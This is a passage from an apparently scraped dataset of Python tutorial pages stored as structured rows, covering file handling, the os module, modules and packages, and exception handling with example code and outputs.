syntax and user-friendly interaction."")  \n    \n#closing the opened file   \nfileptr.close()\n\nOutput:\nPython is the modern day language. It makes things so simple.\nIt is the fastest growing programing language Python has an easy syntax and user-friendly interaction.\n\nSnapshot of the file2.txt\n\nWe can see that the content of the file is modified. We have opened the file in a mode and it appended the content in the existing file2.txt.\nTo read a file using the Python script, the Python provides the read() method. The read() method reads a string from the file. It can read the data in the text as well as a binary format.\nThe syntax of the read() method is given below.\nSyntax:\n\nfileobj.read(<count>)  \n\nHere, the count is the number of bytes to be read from the file starting from the beginning of the file. If the count is not specified, then it may read the content of the file until the end.\nConsider the following example.\nExample\n\n#open the file.txt in read mode. causes error if no such file exists.  \nfileptr = open(""file2.txt"",""r"")\n#stores all the data of the file into the variable content  \ncontent = fileptr.read(10) \n# prints the type of the data stored in the file  \nprint(type(content))    \n#prints the content of the file  \nprint(content)     \n#closes the opened file  \nfileptr.close()  \n\nOutput:\n<class \'str\'>\nPython is \n\nIn the above code, we have read the content of file2.txt by using the read() function. We have passed count value as ten which means it will read the first ten characters from the file.\nIf we use the following line, then it will print all content of the file.\n\ncontent = fileptr.read()\nprint(content) \n\nOutput:\nPython is the modern-day language. It makes things so simple.\nIt is the fastest-growing programing language Python has easy an syntax and user-friendly interaction.\n\nRead file through for loop\nWe can read the file using for loop. Consider the following example.\n\n#open the file.txt in read mode. causes an error if no such file exists.  \nfileptr = open(""file2.txt"",""r"");   \n#running a for loop   \nfor i in fileptr:  \n    print(i) # i contains each line of the file   \n\nOutput:\nPython is the modern day language.\n\nIt makes things so simple.\n\nPython has easy syntax and user-friendly interaction.\n\nRead Lines of the file\nPython facilitates to read the file line by line by using a function readline() method. The readline() method reads the lines of the file from the beginning, i.e., if we use the readline() method two times, then we can get the first two lines of the file.\nConsider the following example which contains a function readline() that reads the first line of our file ""file2.txt"" containing three lines. Consider the following example.\nExample 1: Reading lines using readline() function\n\n#open the file.txt in read mode. causes error if no such file exists.  \nfileptr = open(""file2.txt"",""r"");   \n#stores all the data of the file into the variable content  \ncontent = fileptr.readline()   \ncontent1 = fileptr.readline()\n#prints the content of the file  \nprint(content)   \nprint(content1)\n#closes the opened file  \nfileptr.close()  \n\nOutput:\nPython is the modern day language.\n\nIt makes things so simple.\n\nWe called the readline() function two times that\'s why it read two lines from the file.\nPython provides also the readlines() method which is used for the reading lines. It returns the list of the lines till the end of file(EOF) is reached.\nExample 2: Reading Lines Using readlines() function\n\n#open the file.txt in read mode. causes error if no such file exists.  \nfileptr = open(""file2.txt"",""r"");   \n  \n#stores all the data of the file into the variable content  \ncontent = fileptr.readlines()   \n\n#prints the content of the file  \nprint(content)   \n  \n#closes the opened file  \nfileptr.close()  \n\nOutput:\n[\'Python is the modern day language.\\n\', \'It makes things so simple.\\n\', \'Python has easy syntax and user-friendly interaction.\']\n\nCreating a new file\nThe new file can be created by using one of the following access modes with the function open().\nx: it creates a new file with the specified name. It causes an error a file exists with the same name.\na: It creates a new file with the specified name if no such file exists. It appends the content to the file if the file already exists with the specified name.\nw: It creates a new file with the specified name if no such file exists. It overwrites the existing file.\nConsider the following example.\nExample 1\n\n#open the file.txt in read mode. causes error if no such file exists.  \nfileptr = open(""file2.txt"",""x"") \nprint(fileptr)  \nif fileptr:  \n    print(""File created successfully"")\n\nOutput:\n<_io.TextIOWrapper name=\'file2.txt\' mode=\'x\' encoding=\'cp1252\'>\nFile created successfully \n\nFile Pointer positions\nPython provides the tell() method which is used to print the byte number at which the file pointer currently exists. Consider the following example.\n\n# open the file file2.txt in read mode  \nfileptr = open(""file2.txt"",""r"")  \n\n#initially the filepointer is at 0   \nprint(""The filepointer is at byte :"",fileptr.tell())  \n  \n#reading the content of the file  \ncontent = fileptr.read();  \n  \n#after the read operation file pointer modifies. tell() returns the location of the fileptr.   \n  \nprint(""After reading, the filepointer is at:"",fileptr.tell())  \n\nOutput:\nThe filepointer is at byte : 0\nAfter reading, the filepointer is at: 117\n\nModifying file pointer position\nIn real-world applications, sometimes we need to change the file pointer location externally since we may need to read or write the content at various locations.\nFor this purpose, the Python provides us the seek() method which enables us to modify the file pointer position externally.\nThe syntax to use the seek() method is given below.\nSyntax:\n\n<file-ptr>.seek(offset[, from)  \n\nThe seek() method accepts two parameters:\noffset: It refers to the new position of the file pointer within the file.\nfrom: It indicates the reference position from where the bytes are to be moved. If it is set to 0, the beginning of the file is used as the reference position. If it is set to 1, the current position of the file pointer is used as the reference position. If it is set to 2, the end of the file pointer is used as the reference position.\nConsider the following example.\nExample\n\n# open the file file2.txt in read mode  \nfileptr = open(""file2.txt"",""r"")  \n  \n#initially the filepointer is at 0   \nprint(""The filepointer is at byte :"",fileptr.tell())  \n  \n#changing the file pointer location to 10.  \nfileptr.seek(10);  \n  \n#tell() returns the location of the fileptr.   \nprint(""After reading, the filepointer is at:"",fileptr.tell())  \n\nOutput:\nThe filepointer is at byte : 0\nAfter reading, the filepointer is at: 10\n\nPython OS module\nRenaming the file\nThe Python os module enables interaction with the operating system. The os module provides the functions that are involved in file processing operations like renaming, deleting, etc. It provides us the rename() method to rename the specified file to a new name. The syntax to use the rename() method is given below.\nSyntax:\n\nrename(current-name, new-name)  \n\nThe first argument is the current file name and the second argument is the modified name. We can change the file name bypassing these two arguments.\nExample 1:\n\nimport os  \n  \n#rename file2.txt to file3.txt  \nos.rename(""file2.txt"",""file3.txt"")\n\nOutput:\n\n\nThe above code renamed current file2.txt to file3.txt\nRemoving the file\nThe os module provides the remove() method which is used to remove the specified file. The syntax to use the remove() method is given below.\n\nremove(file-name) \n\nExample 1\n\nimport os;  \n#deleting the file named file3.txt   \nos.remove(""file3.txt"")  \n\nCreating the new directory\nThe mkdir() method is used to create the directories in the current working directory. The syntax to create the new directory is given below.\nSyntax:\n\nmkdir(directory name)\n\nExample 1\n\nimport os  \n  \n#creating a new directory with the name new  \nos.mkdir(""new"")  \n\nThe getcwd() method\nThis method returns the current working directory.\nThe syntax to use the getcwd() method is given below.\nSyntax\n\nos.getcwd()\n\nExample\n\nimport os\nos.getcwd()\n\nOutput:\n\'C:\\\\Users\\\\DEVANSH SHARMA\'\n\nChanging the current working directory\nThe chdir() method is used to change the current working directory to a specified directory.\nThe syntax to use the chdir() method is given below.\nSyntax\n\nchdir(""new-directory"")  \n\nExample\n\nimport os \n# Changing current directory with the new directiory\nos.chdir(""C:\\\\Users\\\\DEVANSH SHARMA\\\\Documents"")\n#It will display the current working directory\nos.getcwd()\n\nOutput:\n\'C:\\\\Users\\\\DEVANSH SHARMA\\\\Documents\'\n\nDeleting directory\nThe rmdir() method is used to delete the specified directory.\nThe syntax to use the rmdir() method is given below.\nSyntax\n\nos.rmdir(directory name)  \n\nExample 1\n\nimport os\n#removing the new directory   \nos.rmdir(""directory_name"")  \n\nIt will remove the specified directory.\nWriting Python output to the files\nIn Python, there are the requirements to write the output of a Python script to a file.\nThe check_call() method of module subprocess is used to execute a Python script and write the output of that script to a file.\nThe following example contains two python scripts. The script file1.py executes the script file.py and writes its output to the text file output.txt.\nExample\nfile.py\n\ntemperatures=[10,-20,-289,100]  \ndef c_to_f(c):  \n    if c< -273.15:  \n        return ""That temperature doesn\'t make sense!""  \n    else:  \n        f=c*9/5+32  \n        return f  \nfor t in temperatures:  \n    print(c_to_f(t))  \n\nfile.py\n\nimport subprocess  \n  \nwith open(""output.txt"", ""wb"") as f:  \n    subprocess.check_call([""python"", ""file.py""], stdout=f)  \n\nThe file related methods \nThe file object provides the following methods to manipulate the files on various operating systems.\n\n\nSN\nMethod\nDescription\n\n\n1\nfile.close()\nIt closes the opened file. The file once closed, it can\'t be read or write anymore.\n\n\n2\nFile.fush()\nIt flushes the internal buffer.\n\n\n3\nFile.fileno()\nIt returns the file descriptor used by the underlying implementation to request I/O from the OS.\n\n\n4\nFile.isatty()\nIt returns true if the file is connected to a TTY device, otherwise returns false.\n\n\n5\nFile.next()\nIt returns the next line from the file.\n\n\n6\nFile.read([size])\nIt reads the file for the specified size.\n\n\n7\nFile.readline([size])\nIt reads one line from the file and places the file pointer to the beginning of the new line.\n\n\n8\nFile.readlines([sizehint])\nIt returns a list containing all the lines of the file. It reads the file until the EOF occurs using readline() function.\n\n\n9\nFile.seek(offset[,from)\nIt modifies the position of the file pointer to a specified offset with the specified reference.\n\n\n10\nFile.tell()\nIt returns the current position of the file pointer within the file.\n\n\n11\nFile.truncate([size])\nIt truncates the file to the optional specified size.\n\n\n12\nFile.write(str)\nIt writes the specified string to a file\n\n\n13\nFile.writelines(seq)\nIt writes a sequence of the strings to a file.\n\n\n\n\nNext TopicPython Modules\n\n\n\n← prev\nnext →\n\n\n', ""It is always suggestible to use the with statement in the case of files because, if the break, return, or exception occurs in the nested block of code then it automatically closes the file, we don't need to write the close() function. It doesn't let the file to corrupt."", 'Python facilitates to read the file line by line by using a function readline() method. The readline() method reads the lines of the file from the beginning, i.e., if we use the readline() method two times, then we can get the first two lines of the file.', 'from: It indicates the reference position from where the bytes are to be moved. If it is set to 0, the beginning of the file is used as the reference position. If it is set to 1, the current position of the file pointer is used as the reference position. If it is set to 2, the end of the file pointer is used as the reference position.', 'The Python os module enables interaction with the operating system. The os module provides the functions that are involved in file processing operations like renaming, deleting, etc. It provides us the rename() method to rename the specified file to a new name. The syntax to use the rename() method is given below.']","['file object = open(<file-name>, <access-mode>, <buffering>)', '#opens the file file.txt in read mode', 'fileptr = open(""file.txt"",""r"")', 'if fileptr:', 'print(""file is opened successfully"")', ""<class '_io.TextIOWrapper'>"", 'file is opened successfully', 'fileobject.close()', '# opens the file file.txt in read mode', 'fileptr = open(""file.txt"",""r"")', 'if fileptr:', 'print(""file is opened successfully"")', '#closes the opened file', 'fileptr.close()', 'fileptr = open(""file.txt"")', '# perform file operations', 'finally:', 'fileptr.close()', 'with open(<file name>, <access mode>) as <file-pointer>:', '#statement suite', 'with open(""file.txt"",\'r\') as f:', 'content = f.read();', 'print(content)', '# open the file.txt in append mode. Create a new file if no such file exists.', 'fileptr = open(""file2.txt"", ""w"")', '# appending the content to the file', ""fileptr.write('''Python is the modern day language. It makes things so simple."", ""It is the fastest-growing programing language''')"", '# closing the opened the file', 'fileptr.close()', 'Python is the modern-day language. It makes things so simple. It is the fastest growing programming language.', '#open the file.txt in write mode.', 'fileptr = open(""file2.txt"",""a"")', '#overwriting the content of the file', 'fileptr.write("" Python has an easy syntax and user-friendly interaction."")', '#closing the opened file', 'fileptr.close()', 'Python is the modern day language. It makes things so simple.', 'It is the fastest growing programing language Python has an easy syntax and user-friendly interaction.', 'fileobj.read(<count>)', '#open the file.txt in read mode. causes error if no such file exists.', 'fileptr = open(""file2.txt"",""r"")', '#stores all the data of the file into the variable content', 'content = fileptr.read(10)', '# prints the type of the data stored in the file', 'print(type(content))', '#prints the content of the file', 'print(content)', '#closes the opened file', 'fileptr.close()', ""<class 'str'>"", 'Python is', 'content = fileptr.read()', 'print(content)', 'Python is the modern-day language. It makes things so simple.', 'It is the fastest-growing programing language Python has easy an syntax and user-friendly interaction.', '#open the file.txt in read mode. causes an error if no such file exists.', 'fileptr = open(""file2.txt"",""r"");', '#running a for loop', 'for i in fileptr:', 'print(i) # i contains each line of the file', 'Python is the modern day language.', 'It makes things so simple.', 'Python has easy syntax and user-friendly interaction.', '#open the file.txt in read mode. causes error if no such file exists.', 'fileptr = open(""file2.txt"",""r"");', '#stores all the data of the file into the variable content', 'content = fileptr.readline()', 'content1 = fileptr.readline()', '#prints the content of the file', 'print(content)', 'print(content1)', '#closes the opened file', 'fileptr.close()', 'Python is the modern day language.', 'It makes things so simple.', '#open the file.txt in read mode. causes error if no such file exists.', 'fileptr = open(""file2.txt"",""r"");', '#stores all the data of the file into the variable content', 'content = fileptr.readlines()', '#prints the content of the file', 'print(content)', '#closes the opened file', 'fileptr.close()', ""['Python is the modern day language.\\n', 'It makes things so simple.\\n', 'Python has easy syntax and user-friendly interaction.']"", '#open the file.txt in read mode. causes error if no such file exists.', 'fileptr = open(""file2.txt"",""x"")', 'print(fileptr)', 'if fileptr:', 'print(""File created successfully"")', ""<_io.TextIOWrapper name='file2.txt' mode='x' encoding='cp1252'>"", 'File created successfully', '# open the file file2.txt in read mode', 'fileptr = open(""file2.txt"",""r"")', '#initially the filepointer is at 0', 'print(""The filepointer is at byte :"",fileptr.tell())', '#reading the content of the file', 'content = fileptr.read();', '#after the read operation file pointer modifies. tell() returns the location of the fileptr.', 'print(""After reading, the filepointer is at:"",fileptr.tell())', 'The filepointer is at byte : 0', 'After reading, the filepointer is at: 117', '<file-ptr>.seek(offset[, from)', '# open the file file2.txt in read mode', 'fileptr = open(""file2.txt"",""r"")', '#initially the filepointer is at 0', 'print(""The filepointer is at byte :"",fileptr.tell())', '#changing the file pointer location to 10.', 'fileptr.seek(10);', '#tell() returns the location of the fileptr.', 'print(""After reading, the filepointer is at:"",fileptr.tell())', 'The filepointer is at byte : 0', 'After reading, the filepointer is at: 10', 'rename(current-name, new-name)', 'import os', '#rename file2.txt to file3.txt', 'os.rename(""file2.txt"",""file3.txt"")', 'remove(file-name)', 'import os;', '#deleting the file named file3.txt', 'os.remove(""file3.txt"")', 'mkdir(directory name)', 'import os', '#creating a new directory with the name new', 'os.mkdir(""new"")', 'os.getcwd()', 'import os', 'os.getcwd()', ""'C:\\\\Users\\\\DEVANSH SHARMA'"", 'chdir(""new-directory"")', 'import os', '# Changing current directory with the new directiory', 'os.chdir(""C:\\\\Users\\\\DEVANSH SHARMA\\\\Documents"")', '#It will display the current working directory', 'os.getcwd()', ""'C:\\\\Users\\\\DEVANSH SHARMA\\\\Documents'"", 'os.rmdir(directory name)', 'import os', '#removing the new directory', 'os.rmdir(""directory_name"")', 'temperatures=[10,-20,-289,100]', 'def c_to_f(c):', 'if c< -273.15:', 'return ""That temperature doesn\'t make sense!""', 'else:', 'f=c*9/5+32', 'return f', 'for t in temperatures:', 'print(c_to_f(t))', 'import subprocess', 'with open(""output.txt"", ""wb"") as f:', 'subprocess.check_call([""python"", ""file.py""], stdout=f)']","[""<class '_io.TextIOWrapper'>\nfile is opened successfully"", 'Python is the modern-day language. It makes things so simple. It is the fastest growing programming language.', 'Python is the modern day language. It makes things so simple.\nIt is the fastest growing programing language Python has an easy syntax and user-friendly interaction.', ""<class 'str'>\nPython is"", 'Python is the modern-day language. It makes things so simple.\nIt is the fastest-growing programing language Python has easy an syntax and user-friendly interaction.', 'Python is the modern day language.\n\nIt makes things so simple.\n\nPython has easy syntax and user-friendly interaction.', 'Python is the modern day language.\n\nIt makes things so simple.', ""['Python is the modern day language.\\n', 'It makes things so simple.\\n', 'Python has easy syntax and user-friendly interaction.']"", ""<_io.TextIOWrapper name='file2.txt' mode='x' encoding='cp1252'>\nFile created successfully"", 'The filepointer is at byte : 0\nAfter reading, the filepointer is at: 117', 'The filepointer is at byte : 0\nAfter reading, the filepointer is at: 10', '', ""'C:\\\\Users\\\\DEVANSH SHARMA'"", ""'C:\\\\Users\\\\DEVANSH SHARMA\\\\Documents'""]","[""SN|||Access mode|||Description&&&1|||r|||It opens the file to read-only mode. The file pointer exists at the beginning. The file is by default open in this mode if no access mode is passed.&&&2|||rb|||It opens the file to read-only in binary format. The file pointer exists at the beginning of the file.&&&3|||r+|||It opens the file to read and write both. The file pointer exists at the beginning of the file.&&&4|||rb+|||It opens the file to read and write both in binary format. The file pointer exists at the beginning of the file.&&&5|||w|||It opens the file to write only. It overwrites the file if previously exists or creates a new one if no file exists with the same name. The file pointer exists at the beginning of the file.&&&6|||wb|||It opens the file to write only in binary format. It overwrites the file if it exists previously or creates a new one if no file exists. The file pointer exists at the beginning of the file.&&&7|||w+|||It opens the file to write and read both. It is different from r+ in the sense that it overwrites the previous file if one exists whereas r+ doesn't overwrite the previously written file. It creates a new file if no file exists. The file pointer exists at the beginning of the file.&&&8|||wb+|||It opens the file to write and read both in binary format. The file pointer exists at the beginning of the file.&&&9|||a|||It opens the file in the append mode. The file pointer exists at the end of the previously written file if exists any. It creates a new file if no file exists with the same name.&&&10|||ab|||It opens the file in the append mode in binary format. The pointer exists at the end of the previously written file. It creates a new file in binary format if no file exists with the same name.&&&11|||a+|||It opens a file to append and read both. The file pointer remains at the end of the file if a file exists. It creates a new file if no file exists with the same name.&&&12|||ab+|||It opens a file to append and read both in binary format. The file pointer remains at the end of the file."", ""SN|||Method|||Description&&&1|||file.close()|||It closes the opened file. The file once closed, it can't be read or write anymore.&&&2|||File.fush()|||It flushes the internal buffer.&&&3|||File.fileno()|||It returns the file descriptor used by the underlying implementation to request I/O from the OS.&&&4|||File.isatty()|||It returns true if the file is connected to a TTY device, otherwise returns false.&&&5|||File.next()|||It returns the next line from the file.&&&6|||File.read([size])|||It reads the file for the specified size.&&&7|||File.readline([size])|||It reads one line from the file and places the file pointer to the beginning of the new line.&&&8|||File.readlines([sizehint])|||It returns a list containing all the lines of the file. It reads the file until the EOF occurs using readline() function.&&&9|||File.seek(offset[,from)|||It modifies the position of the file pointer to a specified offset with the specified reference.&&&10|||File.tell()|||It returns the current position of the file pointer within the file.&&&11|||File.truncate([size])|||It truncates the file to the optional specified size.&&&12|||File.write(str)|||It writes the specified string to a file&&&13|||File.writelines(seq)|||It writes a sequence of the strings to a file.""]",['|||Open a file|||Read or write - Performing operation|||Close the file|||']
29,['Python Modules'],"['A python module can be defined as a python program file which contains a python code including python functions, class, or variables. In other words, we can say that our python code file saved with the extension (.py) is treated as the module. We may have a runnable code inside the python module. ']","['https://www.javatpoint.com/python-exception-handling', 'https://www.javatpoint.com/python-files-io', 'https://www.javatpoint.com/python-exception-handling', 'https://www.javatpoint.com/python-files-io', 'https://www.javatpoint.com/python-exception-handling']",['https://static.javatpoint.com/python/images/python-packages.png'],[],"['Loading the module in our python code', 'The import statement', 'The from-import statement', 'Renaming a module', 'Using dir() function', 'The reload() function', 'Scope of variables', 'Python packages']",[],[],"['Modules in Python provides us the flexibility to organize the code in a logical way.', 'To use the functionality of one module into another, we must have to import the specific module.', 'In this example, we will create a module named as file.py which contains a function func that contains a code to print some message on the console. ', ""Let's create the module named as file.py."", 'Here, we need to include this module into our main module to call the method displayMsg() defined in the module named file.', 'We need to load the module in our python code to use its functionality. Python provides two types of statements as defined below. ', 'The syntax to use the import statement is given below.', 'Consider the following module named as calculation which contains three functions as summation, multiplication, and divide.', 'calculation.py:', 'Consider the following syntax.', 'The syntax to rename a module is given below.', 'Consider the following example.', 'for example, to reload the module calculation defined in the previous example, we must use the following line of code.', 'Consider the following example.', ""Let's create a package named Employees in your home directory. Consider the following steps."", '1. Create a directory with name Employees on path /home.', '2. Create a python source file with name ITEmployees.py on the path /home/Employees.', 'ITEmployees.py', '3. Similarly, create one more python file with name BPOEmployees.py and create a function getBPONames(). ', '__init__.py ', 'We can have sub-packages inside the packages. We can nest the packages up to any level depending upon the application requirements. ']","['The import statement is used to import all the functionality of one module into another. Here, we must notice that we can use the functionality of any python source file by importing that file as the module into another python source file. ', 'We can import multiple modules with a single import statement, but a module is loaded once regardless of the number of times, it has been imported into our file.', 'Hence, if we need to call the function displayMsg() defined in the file file.py, we have to import that file as a module into our module as shown in the example below. ', ""The from...import statement is always better to use if we know the attributes to be imported from the module in advance. It doesn't let our code to be heavier. We can also import all the attributes from a module by using *. "", 'Python provides us the flexibility to import some module with a specific name so that we can use this name to use that module in our python source file. ', 'The dir() function returns a sorted list of names defined in the passed module. This list contains all the sub-modules, variables and functions defined in this module. ', 'In Python, variables are associated with two types of scopes. All the variables defined in a module contain the global scope unless or until it is defined within a function.', 'All the variables defined inside a function contain a local scope that is limited to this function itself. We can not access a local variable globally. ', 'If two variables are defined with the same name with the two different scopes, i.e., local and global, then the priority will always be given to the local variable.', '5. Now, the directory Employees has become the package containing two python modules. Here we must notice that we must have to create __init__.py inside a directory to convert this directory to a package.', ""6. To use the modules defined inside the package Employees, we must have to import this in our python source file. Let's create a simple python source file at our home directory (/home) which uses the modules defined in this package."", 'The following image shows the directory structure of an application Library management system which contains three sub-packages as Admin, Librarian, and Student. The sub-packages contain the python modules.']","['Instead of importing the whole module into the namespace, python provides the flexibility to import only the specific attributes of a module. This can be done by using from? import statement. The syntax to use the from-import statement is given below. ', 'As we have already stated that, a module is loaded once regardless of the number of times it is imported into the python source file. However, if you want to reload the already imported module to re-execute the top-level code, python provides us the reload() function. The syntax to use the reload() function is given below. ', 'The packages in python facilitate the developer with the application development environment by providing a hierarchical directory structure where a package contains sub-packages, modules, and sub-modules. The packages are used to categorize the application level code efficiently.', '4. Now, the directory Employees which we have created in the first step contains two python modules. To make this directory a package, we need to include one more file here, that is __init__.py which contains the import statements of the modules defined in this directory.']","['#displayMsg prints a message to the name being passed.', 'def displayMsg(name)', 'print(""Hi ""+name);', 'import module1,module2,........ module n', 'import file;', 'name = input(""Enter the name?"")', 'file.displayMsg(name)', 'from < module-name> import <name 1>, <name 2>..,<name n>', '#place the code in the calculation.py', 'def summation(a,b):', 'return a+b', 'def multiplication(a,b):', 'return a*b;', 'def divide(a,b):', 'return a/b;', 'from calculation import summation', '#it will import only the summation() from calculation.py', 'a = int(input(""Enter the first number""))', 'b = int(input(""Enter the second number""))', 'print(""Sum = "",summation(a,b)) #we do not need to specify the module name while accessing summation()', 'from <module> import *', 'import <module-name> as <specific-name>', '#the module calculation of previous example is imported in this example as cal.', 'import calculation as cal;', 'a = int(input(""Enter a?""));', 'b = int(input(""Enter b?""));', 'print(""Sum = "",cal.summation(a,b))', 'import json', 'List = dir(json)', 'print(List)', 'reload(<module-name>)', 'reload(calculation)', 'name = ""john""', 'def print_name(name):', 'print(""Hi"",name) #prints the name that is local to this function only.', 'name = input(""Enter the name?"")', 'print_name(name)', 'def getITNames():', 'List = [""John"", ""David"", ""Nick"", \t""Martin""]', 'return List;', 'from ITEmployees import getITNames', 'from BPOEmployees import getBPONames', 'import Employees', 'print(Employees.getNames())']","['Enter the name?John\nHi John', 'Enter the first number10\nEnter the second number20\nSum =  30', 'Enter a?10\nEnter b?20\nSum =  30', ""['JSONDecoder', 'JSONEncoder', '__all__', '__author__', '__builtins__', '__cached__', '__doc__',\n'__file__', '__loader__', '__name__', '__package__', '__path__', '__spec__', '__version__', \n'_default_decoder', '_default_encoder', 'decoder', 'dump', 'dumps', 'encoder', 'load', 'loads', 'scanner']"", 'Hi David', ""['John', 'David', 'Nick', 'Martin']""]",[],['|||The import statement |||The from-import statement|||']
30,['Python Exception'],['An exception can be defined as an unusual condition in a program resulting in the interruption in the flow of the program.'],"['https://www.javatpoint.com/python-date', 'https://www.javatpoint.com/python-modules', 'https://www.javatpoint.com/python-date', 'https://www.javatpoint.com/python-modules', 'https://www.javatpoint.com/python-date']","['https://static.javatpoint.com/python/images/python-exception-handling.png', 'https://static.javatpoint.com/python/images/python-exception-handling2.png', 'https://static.javatpoint.com/python/images/python-exception-handling3.png']",[],"['Common Exceptions', 'The problem without handling exceptions', 'Exception handling in python', 'Declaring Multiple Exceptions', 'The try...finally block', 'Raising exceptions', 'Custom Exception ']","['Example', 'The try-expect statement', 'The except statement using with exception variable']",[],"['Python has many built-in exceptions that enable our program to run without interruption and give the output. These exceptions are given below:', 'As we have already discussed, the exception is an abnormal condition that halts the execution of the program. ', 'Consider the following example.', 'The syntax to use the else statement with the try-except statement is given below.', 'Consider the following program.', 'Python provides the flexibility not to specify the name of exception with the exception statement.', 'Consider the following example.', 'Consider the following example.', 'The syntax to use the finally block is given below.', 'The syntax to use the raise statement is given below.', 'Points to remember', 'Example 2 Raise the exception with message', 'Consider the following example.']","[""Python provides a way to handle the exception so that the code can be executed without any interruption. If we do not handle the exception, the interpreter doesn't execute all the code that exists after the exception."", 'Python provides the number of built-in exceptions, but here we are describing the common standard exceptions. A list of common exceptions that can be thrown from a standard Python program is given below.', 'We can also use the else statement with the try-except statement in which, we can place the code which will be executed in the scenario if no exception occurs in the try block.', 'We can use the exception variable with the except statement. It is used by using the as keyword. this object will return the cause of the exception. Consider the following example:', 'The Python allows us to declare the multiple exceptions with the except clause. Declaring multiple exceptions is useful in the cases where a try block throws multiple exceptions. The syntax is given below.', 'Python provides the optional finally statement, which is used with the try statement. It is executed no matter what exception occurs and used to release the external resource. The finally block provides a guarantee of the execution.', 'We can use the finally block with the try block in which we can pace the necessary code, which must be executed before the try statement throws an exception.', 'An exception can be raised forcefully by using the raise clause in Python. It is useful in in that scenario where we need to raise an exception to stop the execution of the program.', 'For example, there is a program that requires 2GB memory for execution, and if the program tries to occupy 2GB of memory, then we can raise an exception to stop the execution of the program.', 'The Python allows us to create our exceptions that can be raised from the program and caught using the except clause. However, we suggest you read this section after visiting the Python object and classes.']","['Whenever an exception occurs, the program stops the execution, and thus the further code is not executed. Therefore, an exception is the run-time errors that are unable to handle to Python script. An exception is a Python object that represents an error', ""Suppose we have two variables a and b, which take the input from the user and perform the division of these values. What if the user entered the zero as the denominator? It will interrupt the program execution and through a ZeroDivision exception. Let's see the following example."", ""The above program is syntactically correct, but it through the error because of unusual input. That kind of programming may not be suitable or recommended for the projects because these projects are required uninterrupted execution. That's why an exception-handling plays an essential role in handling these unexpected exceptions. We can handle these exceptions in the following way. "", 'If the Python program contains suspicious code that may throw the exception, we must place that code in the try block. The try block must be followed with the except statement, which contains a block of code that will be executed if there is some exception in the try block.']","['a = int(input(""Enter a:""))', 'b = int(input(""Enter b:""))', 'c = a/b', 'print(""a/b = %d"" %c)', '#other code:', 'print(""Hi I am other part of the program"")', '#block of code', 'except Exception1:', '#block of code', 'except Exception2:', '#block of code', '#other code', 'a = int(input(""Enter a:""))', 'b = int(input(""Enter b:""))', 'c = a/b', 'except:', 'print(""Can\'t divide with zero"")', '#block of code', 'except Exception1:', '#block of code', 'else:', '#this code executes if no except block is executed', 'a = int(input(""Enter a:""))', 'b = int(input(""Enter b:""))', 'c = a/b', 'print(""a/b = %d""%c)', '# Using Exception with except statement. If we print(Exception) it will return exception class', 'except Exception:', 'print(""can\'t divide by zero"")', 'print(Exception)', 'else:', 'print(""Hi I am else block"")', 'a = int(input(""Enter a:""))', 'b = int(input(""Enter b:""))', 'c = a/b;', 'print(""a/b = %d""%c)', 'except:', 'print(""can\'t divide by zero"")', 'else:', 'print(""Hi I am else block"")', 'a = int(input(""Enter a:""))', 'b = int(input(""Enter b:""))', 'c = a/b', 'print(""a/b = %d""%c)', '# Using exception object with the except statement', 'except Exception as e:', 'print(""can\'t divide by zero"")', 'print(e)', 'else:', 'print(""Hi I am else block"")', ""#this will throw an exception if the file doesn't exist."", 'fileptr = open(""file.txt"",""r"")', 'except IOError:', 'print(""File not found"")', 'else:', 'print(""The file opened successfully"")', 'fileptr.close()', '#block of code', 'except (<Exception 1>,<Exception 2>,<Exception 3>,...<Exception n>)', '#block of code', 'else:', '#block of code', 'try:', 'a=10/0;', 'except(ArithmeticError, IOError):', 'print(""Arithmetic Exception"")', 'else:', 'print(""Successfully Done"")', '# block of code', '# this may throw an exception', 'finally:', '# block of code', '# this will always be executed', 'fileptr = open(""file2.txt"",""r"")', 'try:', 'fileptr.write(""Hi I am good"")', 'finally:', 'fileptr.close()', 'print(""file closed"")', 'except:', 'print(""Error"")', 'raise Exception_class,<value>', 'age = int(input(""Enter the age:""))', 'if(age<18):', 'raise ValueError', 'else:', 'print(""the age is valid"")', 'except ValueError:', 'print(""The age is not valid"")', 'num = int(input(""Enter a positive integer: ""))', 'if(num <= 0):', '# we can pass the message in the raise statement', 'raise ValueError(""That is  a negative number!"")', 'except ValueError as e:', 'print(e)', 'a = int(input(""Enter a:""))', 'b = int(input(""Enter b:""))', 'if b is 0:', 'raise ArithmeticError', 'else:', 'print(""a/b = "",a/b)', 'except ArithmeticError:', 'print(""The value of b can\'t be 0"")', 'class ErrorInCode(Exception):', 'def __init__(self, data):', 'self.data = data', 'def __str__(self):', 'return repr(self.data)', 'try:', 'raise ErrorInCode(2000)', 'except ErrorInCode as ae:', 'print(""Received error:"", ae.data)', 'Received error: 2000']","['Enter a:10', 'Enter b:0', 'Traceback (most recent call last):', 'File ""exception-test.py"", line 3, in <module>', 'c = a/b;', 'ZeroDivisionError: division by zero', 'Enter a:10', 'Enter b:0', ""Can't divide with zero"", 'Enter a:10', 'Enter b:0', ""can't divide by zero"", ""<class 'Exception'>"", 'Enter a:10', 'Enter b:0', ""can't divide by zero"", 'division by zero', 'File not found', 'Arithmetic Exception', 'file closed', 'Error', 'Enter the age:17', 'The age is not valid', 'Enter a positive integer: -5', 'That is a negative number!', 'Enter a:10', 'Enter b:0', ""The value of b can't be 0"", 'Received error: 2000']",[],"['|||ZeroDivisionError: Occurs when a number is divided by zero.|||NameError: It occurs when a name is not found. It may be local or global.|||IndentationError: If incorrect indentation is given.|||IOError: It occurs when Input Output operation fails.|||EOFError: It occurs when the end of the file is reached, and yet operations are being performed.||||||Python facilitates us to not specify the exception with the except statement.|||We can declare multiple exceptions in the except statement since the try block may contain the statements which throw the different type of exceptions.|||We can also specify an else block along with the try-except statement, which will be executed if no exception is raised in the try block.|||The statements that don\'t throw the exception should be placed inside the else block.||||||To raise an exception, the raise statement is used. The exception class name follows it.|||An exception can be provided with a value that can be given in the parenthesis.|||To access the value ""as"" keyword is used. ""e"" is used as a reference variable which stores the value of the exception.|||We can pass the value to an exception to specify the exception type.|||']"
